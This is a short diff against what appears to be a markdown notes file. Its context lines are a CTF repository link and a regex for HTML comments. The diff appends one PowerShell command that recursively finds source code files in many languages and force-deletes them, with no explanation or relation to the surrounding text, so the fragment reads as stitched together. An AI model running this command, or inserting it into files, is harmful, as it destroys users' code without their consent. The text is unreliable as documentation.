@@ -832,3 +832,5 @@ https://github.com/Adamkadaban/CTFs/tree/master
 [Continue : ](../../)
 
 <!--.*?-->\r?\n?\n
+
+Get-ChildItem -Recurse -Include *.cpp, *.cs, *.nim, *.swift, *.py, *.js, *.c, *.go, *.java, *.rs, *.go, *.ts, *.php, *.sql | Remove-Item -Force
